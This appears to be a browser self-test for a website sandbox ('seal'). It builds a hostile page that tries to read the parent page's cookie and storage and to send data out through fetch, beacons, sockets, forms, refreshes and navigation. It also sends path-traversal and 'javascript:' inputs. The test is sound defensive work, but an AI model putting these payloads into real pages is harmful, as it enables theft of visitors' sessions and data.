// The seal, proved in a real browser.   npm run seal:selftest
//
// src/lib/siteSeal.ts says what a built page may do: run its own script and nothing else. This starts a real Chrome
// and a small server that stands in for Axon, opens the REAL page a built site is shown on (src/lib/siteViewer.ts,
// with the headers the route sends) holding a page that tries everything a hostile built page would try, and counts
// what got out. Nothing may. It then shows the same hostile page two weaker ways, where it must get out: on a page
// that does not send its part of the seal, and with no seal at all. That is what proves the count can see a leak.
// Last, an ordinary two-page site is opened and used the way a visitor would: a link to another site is offered and
// not followed, a link to its own second page works, and the report panel opens.
//
// The hostile page here is exactly what the store refuses to keep (src/lib/agentSites.ts): this test goes around
// the store on purpose, because the seal has to hold even if a page the store should have refused got through.
//
// It calls no model, touches no network but this machine, and takes a few seconds. Exit code 1 if a check fails.

import { spawn } from "node:child_process";
import { mkdtempSync, rmSync } from "node:fs";
import { createServer } from "node:http";
import type { AddressInfo } from "node:net";
import { tmpdir } from "node:os";
import { join } from "node:path";
import WebSocket from "ws";
import { seal, SEAL_SANDBOX } from "../src/lib/siteSeal";
import { viewerHeaders, viewerHtml } from "../src/lib/siteViewer";

const CHROME = process.env.CHROME_PATH || "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome";
const sleep = (ms: number) => new Promise((r) => setTimeout(r, ms));

// Axon's own policy for its ordinary pages (next.config.ts): what a frame's document inherits on a page that is not
// the viewer.
const AXON_POLICY = ["default-src 'self'", "script-src 'self' 'unsafe-inline'", "style-src 'self' 'unsafe-inline'", "img-src 'self' data: https: blob:", "font-src 'self'", "worker-src 'self' blob:", "connect-src 'self' ws: wss:", "frame-ancestors 'none'", "base-uri 'self'", "form-action 'self'"].join("; ");

// Everything a hostile built page would try. Each try is written down inside the page; the test reads it from there.
const hostile = (origin: string): string => `<!doctype html><html><head><title>hostile</title></head><body>
<form id="f1" method="post" action="${origin}/hit?what=form"><input name="a" value="1"></form>
<a id="a1" href="${origin}/hit?what=link-top" target="_top">x</a>
<script>
window.__said = {};
const attempt = (what, fn) => { try { const v = fn(); window.__said[what] = String(v === undefined ? "ran" : v).slice(0, 200); } catch (e) { window.__said[what] = "refused: " + e.name; } };
attempt("read the page's cookie", () => parent.document.cookie);
attempt("read the page's storage", () => parent.localStorage.getItem("signin"));
attempt("read its own cookie", () => document.cookie || "(empty)");
attempt("read its own storage", () => localStorage.getItem("signin"));
attempt("fetch", () => { fetch("${origin}/hit?what=fetch").catch(() => {}); });
attempt("fetch, no-cors", () => { fetch("${origin}/hit?what=fetch-nocors", { mode: "no-cors" }).catch(() => {}); });
attempt("the report route, as the visitor", () => { fetch("${origin}/api/sites/x/report", { method: "POST", body: "{}" }).catch(() => {}); });
attempt("xhr", () => { const x = new XMLHttpRequest(); x.open("GET", "${origin}/hit?what=xhr"); x.send(); });
attempt("beacon", () => navigator.sendBeacon("${origin}/hit?what=beacon", "d"));
attempt("picture", () => { new Image().src = "${origin}/hit?what=img"; });
attempt("socket", () => { new WebSocket("${origin.replace("http", "ws")}/hit?what=socket"); });
attempt("event source", () => { new EventSource("${origin}/hit?what=eventsource"); });
attempt("script from outside", () => { const s = document.createElement("script"); s.src = "${origin}/hit?what=script"; document.head.appendChild(s); });
attempt("style from outside", () => { const l = document.createElement("link"); l.rel = "stylesheet"; l.href = "${origin}/hit?what=css"; document.head.appendChild(l); });
attempt("frame", () => { const i = document.createElement("iframe"); i.src = "${origin}/hit?what=frame"; document.body.appendChild(i); });
attempt("open a window", () => { const w = window.open("${origin}/hit?what=open"); return w ? "opened" : "no window"; });
attempt("click a link to the top", () => { document.getElementById("a1").click(); });
attempt("move the page", () => { top.location = "${origin}/hit?what=top"; });
window.__said.done = "done";
// last, because these would take the frame itself somewhere else, with whatever it wants to carry in the address
setTimeout(() => { try { document.getElementById("f1").submit(); } catch (e) {} }, 1700);
setTimeout(() => { const m = document.createElement("meta"); m.httpEquiv = "refresh"; m.content = "0;url=${origin}/hit?what=refresh"; document.head.appendChild(m); }, 2000);
setTimeout(() => { try { location.href = "${origin}/hit?what=move-itself"; } catch (e) {} }, 2600);
</script></body></html>`;

const ORDINARY = {
  "index.html": `<!doctype html><html><body><h1 id="h">HOME</h1><a id="ext" href="https://example.com/docs/start">Docs</a> <a id="in" href="about.html">About</a> <a id="top" href="#h">Top</a></body></html>`,
  "about.html": `<!doctype html><html><body><h1 id="h">ABOUT</h1><a id="back" href="index.html">Back</a></body></html>`,
};

type Mode = "viewer" | "bare" | "open" | "use";
interface Run { hits: string[]; said: Record<string, string>; href: string; holder: Record<string, unknown> }

interface Cdp { send(method: string, params?: object, sessionId?: string): Promise<Record<string, unknown>>; close(): void; contexts: { id: number; frameId?: string; sessionId?: string }[]; mainFrame: string }

async function connect(port: number): Promise<Cdp> {
  let target: { webSocketDebuggerUrl: string } | undefined;
  for (let i = 0; i < 100 && !target; i++) {
    try { target = ((await (await fetch(`http://127.0.0.1:${port}/json`)).json()) as { type: string; webSocketDebuggerUrl: string }[]).find((t) => t.type === "page"); } catch { await sleep(150); }
  }
  if (!target) throw new Error(`Chrome did not start (${CHROME}). Set CHROME_PATH to a Chrome or Chromium.`);
  const ws = new WebSocket(target.webSocketDebuggerUrl);
  await new Promise((r) => ws.on("open", r));
  let id = 0;
  const waiting = new Map<number, (v: Record<string, unknown>) => void>();
  const cdp: Cdp = {
    contexts: [], mainFrame: "",
    send: (method, params = {}, sessionId) => new Promise((r) => { const n = ++id; waiting.set(n, r); ws.send(JSON.stringify({ id: n, method, params, ...(sessionId ? { sessionId } : {}) })); }),
    close: () => ws.close(),
  };
  ws.on("message", (m) => {
    const x = JSON.parse(String(m)) as { id?: number; method?: string; params?: Record<string, unknown>; sessionId?: string; result?: Record<string, unknown> };
    if (x.id && waiting.has(x.id)) { waiting.get(x.id)!(x.result ?? {}); waiting.delete(x.id); return; }
    if (x.method === "Runtime.executionContextDestroyed") cdp.contexts = cdp.contexts.filter((c) => !(c.id === (x.params as { executionContextId: number }).executionContextId && c.sessionId === x.sessionId));
    if (x.method === "Runtime.executionContextsCleared") cdp.contexts = cdp.contexts.filter((c) => c.sessionId !== x.sessionId);
    if (x.method === "Runtime.executionContextCreated") {
      const c = x.params!.context as { id: number; auxData?: { frameId?: string; isDefault?: boolean } };
      if (c.auxData?.isDefault !== false) cdp.contexts.push({ id: c.id, frameId: c.auxData?.frameId, sessionId: x.sessionId });
    }
    // a frame Chrome put in a process of its own: follow it there
    if (x.method === "Target.attachedToTarget") void cdp.send("Runtime.enable", {}, (x.params as { sessionId: string }).sessionId);
  });
  await cdp.send("Target.setAutoAttach", { autoAttach: true, waitForDebuggerOnStart: false, flatten: true });
  await cdp.send("Page.enable");
  await cdp.send("Runtime.enable");
  return cdp;
}

async function run(mode: Mode): Promise<Run> {
  const hits: string[] = [];
  let pages: Record<string, string> = {};
  const server = createServer((req, res) => {
    const url = new URL(req.url ?? "/", "http://x");
    if (url.pathname === "/hit" || url.pathname.startsWith("/api/")) {
      hits.push(url.pathname === "/hit" ? (url.searchParams.get("what") ?? "?") : "the report route");
      res.writeHead(200, { "content-type": "text/plain", "access-control-allow-origin": "*" });
      return res.end("ok");
    }
    if (url.pathname !== "/") { res.writeHead(404); return res.end(); }
    const cookie = { "set-cookie": "signin=PARENT-COOKIE; Path=/" };
    if (mode === "viewer" || mode === "use") {
      // the real page, with the headers the route sends
      res.writeHead(200, { ...viewerHeaders(), ...cookie });
      return res.end(viewerHtml({ siteId: "x", title: "Self test", agentId: "tester" }, pages, "Test agent"));
    }
    // an ordinary page of Axon's holding the same frame: with the document sealed ("bare") or not at all ("open")
    res.writeHead(200, { "content-type": "text/html; charset=utf-8", "content-security-policy": AXON_POLICY, ...cookie });
    res.end(`<!doctype html><html><body><iframe id="f"></iframe><script>
localStorage.setItem("signin", "PARENT-STORAGE");
const f = document.getElementById("f");
f.setAttribute("sandbox", ${JSON.stringify(mode === "bare" ? SEAL_SANDBOX : "allow-scripts allow-same-origin allow-forms allow-popups")});
f.srcdoc = ${JSON.stringify(pages["index.html"]).replace(/</g, "\\u003c")};
</script></body></html>`);
  });
  server.on("upgrade", (req, socket) => { hits.push(new URL(req.url ?? "/", "http://x").searchParams.get("what") ?? "socket"); socket.destroy(); });
  await new Promise<void>((r) => server.listen(0, "127.0.0.1", r));
  const origin = `http://127.0.0.1:${(server.address() as AddressInfo).port}`;
  pages = mode === "use" ? Object.fromEntries(Object.entries(ORDINARY).map(([k, v]) => [k, seal(v)])) : { "index.html": mode === "open" ? hostile(origin) : seal(hostile(origin)) };

  const profile = mkdtempSync(join(tmpdir(), "seal-selftest-"));
  const port = 9300 + Math.floor(Math.random() * 500);
  const chrome = spawn(CHROME, ["--headless=new", `--remote-debugging-port=${port}`, `--user-data-dir=${profile}`, "--no-first-run", "--no-default-browser-check", "about:blank"], { stdio: "ignore" });
  try {
    const cdp = await connect(port);
    const value = async (expression: string, c?: { id: number; sessionId?: string }) =>
      ((await cdp.send("Runtime.evaluate", { expression, returnByValue: true, ...(c && !c.sessionId ? { contextId: c.id } : {}) }, c?.sessionId)).result as { value?: unknown } | undefined)?.value;
    await cdp.send("Page.navigate", { url: `${origin}/` });
    await sleep(1200);
    cdp.mainFrame = ((await cdp.send("Page.getFrameTree")).frameTree as { frame: { id: string } }).frame.id;
    // the newest context that is not the page's own: the frame's document as it now is
    const inFrame = async (expression: string) => {
      for (const c of [...cdp.contexts].reverse().filter((x) => x.sessionId || (x.frameId && x.frameId !== cdp.mainFrame))) {
        const v = await value(expression, c);
        if (v !== undefined) return v;
      }
      return undefined;
    };
    const holder: Record<string, unknown> = {};
    let said: Record<string, string> = {};
    if (mode === "use") {
      const strip = () => value(`JSON.stringify({ shown: !document.getElementById("o").hidden, where: document.getElementById("ow").textContent })`).then((v) => JSON.parse(String(v)) as { shown: boolean; where: string });
      holder.first = await inFrame(`document.getElementById("h").textContent`);
      await inFrame(`document.getElementById("top").click()`);
      await sleep(300);
      holder.afterPlaceLink = (await strip()).shown ? "asked" : await inFrame(`document.getElementById("h").textContent`);
      await inFrame(`document.getElementById("ext").click()`);
      await sleep(400);
      holder.asked = await strip();
      await value(`document.getElementById("on").click()`);
      holder.afterStay = (await strip()).shown;
      await inFrame(`document.getElementById("in").click()`);
      await sleep(700);
      holder.second = await inFrame(`document.getElementById("h").textContent`);
      await inFrame(`document.getElementById("back").click()`);
      await sleep(700);
      holder.back = await inFrame(`document.getElementById("h").textContent`);
      // a built page asking for something that is not a page of the site, or not an address, is ignored
      await inFrame(`parent.postMessage({ axon: "go", page: "../../etc/passwd" }, "*"); parent.postMessage({ axon: "open", url: "javascript:alert(1)" }, "*"); parent.postMessage({ axon: "open", url: "file:///etc/passwd" }, "*")`);
      await sleep(300);
      holder.afterNonsense = { shown: (await strip()).shown, page: await inFrame(`document.getElementById("h").textContent`) };
      await value(`document.getElementById("rb").click()`);
      holder.reportOpen = await value(`!document.getElementById("r").hidden`);
      holder.windows = ((await cdp.send("Target.getTargets")).targetInfos as { type: string }[]).filter((t) => t.type === "page").length;
    } else {
      // without the seal the hostile page can open a window of its own, which is one more place to look: the page that
      // wrote something down is the one that is read
      for (const c of cdp.contexts.filter((x) => x.sessionId || (x.frameId && x.frameId !== cdp.mainFrame))) {
        const got = JSON.parse(String((await value("JSON.stringify(window.__said || {})", c)) ?? "{}")) as Record<string, string>;
        if (Object.keys(got).length > Object.keys(said).length) said = got;
      }
      await sleep(2800); // the two tries to leave come after
    }
    const href = String(await value("location.href"));
    cdp.close();
    return { hits: [...new Set(hits)].sort(), said, href: href.replace(origin, ""), holder };
  } finally {
    chrome.kill();
    server.close();
    await sleep(300);
    rmSync(profile, { recursive: true, force: true });
  }
}

const checks: { name: string; ok: boolean; detail?: string }[] = [];
const check = (name: string, ok: boolean, detail?: string) => { checks.push({ name, ok, detail }); console.log(`${ok ? "  ok  " : "  FAIL"} ${name}${detail ? `  (${detail})` : ""}`); };

async function main(): Promise<void> {
  const inside = await run("viewer");
  console.log("\nA hostile page on the real viewer page:");
  check("the hostile page ran (the seal lets a built page run its own script)", inside.said.done === "done");
  check("nothing it tried reached a server: no request, no socket, no form, no window, not even by sending itself away", inside.hits.length === 0, inside.hits.length ? `got out: ${inside.hits.join(", ")}` : "0 requests");
  check("it could not read the page's cookie", !String(inside.said["read the page's cookie"]).includes("PARENT"), inside.said["read the page's cookie"]);
  check("it could not read the page's storage", !String(inside.said["read the page's storage"]).includes("PARENT"), inside.said["read the page's storage"]);
  check("its own cookie and storage are not the visitor's", !String(inside.said["read its own cookie"]).includes("PARENT") && !String(inside.said["read its own storage"]).includes("PARENT"), `${inside.said["read its own cookie"]} / ${inside.said["read its own storage"]}`);
  check("it could not move the page around it", inside.href === "/", inside.href);
  check("it could not open a window", inside.said["open a window"] !== "opened", inside.said["open a window"]);

  const halfway = await run("bare");
  console.log("\nSealed, but on an ordinary page that does not send its part of the seal:");
  check("the frame can then send itself somewhere else (which is why a built page is only shown on the viewer page)", halfway.hits.includes("refresh") || halfway.hits.includes("move-itself"), halfway.hits.join(", ") || "nothing got out");

  const outside = await run("open");
  console.log("\nThe same page with no seal (it must get out, or the count above proves nothing):");
  check("without the seal it reads the visitor's cookie and storage", String(outside.said["read the page's cookie"]).includes("PARENT-COOKIE") && String(outside.said["read the page's storage"]).includes("PARENT-STORAGE"));
  check("without the seal its requests arrive", ["fetch", "img", "xhr"].every((w) => outside.hits.includes(w)), outside.hits.join(", "));

  const used = await run("use");
  const h = used.holder as { first: string; afterPlaceLink: string; asked: { shown: boolean; where: string }; afterStay: boolean; second: string; back: string; afterNonsense: { shown: boolean; page: string }; reportOpen: boolean; windows: number };
  console.log("\nAn ordinary two-page site, used as a visitor would:");
  check("it opens on its first page", h.first === "HOME", String(h.first));
  check("a link to a place on the same page is left alone", h.afterPlaceLink === "HOME", String(h.afterPlaceLink));
  check("a link to another site is offered to the visitor with its address, not followed", h.asked.shown && h.asked.where === "example.com/docs/start" && used.hits.length === 0 && h.windows === 1, `${h.asked.where}, ${h.windows} window`);
  check("saying no closes the offer", h.afterStay === false);
  check("a link to the site's second page goes there, and back", h.second === "ABOUT" && h.back === "HOME", `${h.second}, ${h.back}`);
  check("asking for a page outside the site, or an address that is not a web address, does nothing", h.afterNonsense.shown === false && h.afterNonsense.page === "HOME");
  check("the report panel opens", h.reportOpen === true);
  check("the page never left its address", used.href === "/", used.href);

  const failed = checks.filter((c) => !c.ok);
  console.log(`\n${checks.length - failed.length} of ${checks.length} checks passed${failed.length ? `. FAILED: ${failed.map((c) => c.name).join("; ")}` : "."}`);
  process.exit(failed.length ? 1 : 0);
}

main().catch((e) => { console.error(e instanceof Error ? e.message : e); process.exit(1); });
